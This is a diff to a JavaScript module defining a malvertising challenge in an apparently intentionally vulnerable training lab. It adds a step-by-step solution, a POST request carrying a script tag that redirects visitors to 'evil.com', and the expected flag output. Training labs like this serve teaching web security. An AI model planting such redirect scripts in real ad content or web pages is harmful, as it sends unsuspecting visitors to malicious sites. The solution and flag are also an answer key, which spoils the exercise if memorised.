@@ -47,6 +47,8 @@ module.exports = {
     theory: "Malvertising relies on injecting malicious code into legitimate online advertising networks, redirecting users to exploit kits or dropping malware.",
     exploit: "Supply a deceptive banner ad payload containing a silent iframe or JS redirect.",
     hint: "Send a payload like `<script>window.location='malware.com'</script>` encoded in an ad snippet.",
+    whatToSolve: "Send a POST request to /api/vulns/malvertising/execute with body: { payload: '<script>window.location=\'evil.com\'</script> redirect to evil', level: 'low' }. The ad network embeds your payload in a page without validation — injecting JavaScript that sets 'location=', performs a 'redirect', or references 'evil' silently redirects victims visiting the page.",
+    expectedOutput: "{ success: true, message: 'Exploit successful! Here is your flag: flag{malvertising_success}' }",
     mitigations: ["Use iframe sandboxing (`sandbox=\"allow-scripts\"`) for 3rd party ads.","Enforce strict Content Security Policies on trusted endpoints only."],
     router: router
 };
